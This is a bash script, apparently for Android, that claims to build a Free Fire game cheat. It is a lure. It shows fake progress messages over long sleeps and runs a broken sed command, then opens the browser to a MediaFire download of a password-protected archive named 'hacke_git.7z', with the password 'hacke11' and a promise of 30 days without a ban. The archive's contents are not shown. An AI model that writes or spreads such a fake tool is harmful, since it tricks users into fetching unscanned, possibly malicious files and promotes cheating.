#!/bin/bash
now="$(date)"
printf "%s\n"
now="$(date +'%d/%m/%Y')"

m="$(date)"

m="$(date +'%H:%M:%S')"

null="~> /dev/null 2>&1"
g="\033[1;32m"
r="\033[1;31m"
b="\033[1;34m"
i="\033[33m"                                                                            P="\033[35m"
w="\033[0m"
B="\e[1;40m"
M="\e[1;45m"
C="\e[1;46m"
B="\e[1;40m"
w="\033[0m"
Z="\033[4;31m"
K="\033[0;100m"
D="\033[4;31m"
G="\033[1;96m"
W="\e[1;0m"
LG="\033[1;30m"
GL="\033[1;33m"
CA="\033[1;0;36m"
BO="\033[1;0;33m"
C1="\033[1;92m"
LC="\033[0;37m"





echo -e $G ""
figlet FF-scrp

echo -e $r"Simple Script Creator Tool For FF"
echo ""



if [[ ! -e '/system/bin/adb' ]]; then 
	echo ""
else
	exit
fi


echo -e $g"Your Script Is Getting Ready "
sleep 6
echo ""
echo -e $G"Making Script With Java"
sleep 3m
sed -89 script.java &> /dev/null;
echo "" 
echo -e $G"Uploading Script To Web Browser..."
sleep 20 
echo ""
echo -e $P"Make Sure The Script is AntiBan For $g 30days"
echo ""
echo -e $GL"Download This And extract $g Pass : $P hacke11"
echo ""
echo -e $i"Opening Browser......"
am start --user 0 -n com.android.chrome/com.google.android.apps.chrome.Main -d https://www.mediafire.com/file/5f10i1zx17ke7ro/hacke_git.7z/file?dkey=99 &> /dev/null;
echo ""
echo -e $G"If Brower Is Not Open Then Exit And Start Again"
echo ""
echo -e $G"If You Want To Know How to Do It "
echo ""
echo -e $G"Watch The Video Here : $P Yt video.com"





